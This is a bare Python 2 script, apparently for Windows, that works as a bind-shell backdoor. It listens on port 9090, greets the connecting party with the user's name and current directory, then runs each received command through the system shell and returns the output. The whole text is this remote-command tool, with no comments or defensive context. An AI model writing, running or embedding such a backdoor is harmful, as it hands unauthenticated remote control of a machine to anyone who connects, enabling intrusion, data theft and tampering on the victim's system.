from socket import socket
from os import getcwd, chdir, environ
from subprocess import Popen, PIPE
username = environ.get('USERNAME')
s = socket()
host = ""
port = 9090
s.bind((host, port))
s.listen(2)
print("Listening ....")

conn, address = s.accept()
print("connected with " + str(address))
conn.send("Connected to " + username + "'s computer\n" + getcwd())
while True:
    cmd = (conn.recv(1024))
    if cmd[:3] == "cd " and not cmd == "cd":
        try:
            chdir(cmd[3:])
            response = ""
        except WindowsError:
            response = "Directory Not Found"
    else:
        response = Popen(cmd, shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)
        response = response.stdout.read() + response.stderr.read()
    conn.send(response + "\n" + getcwd())
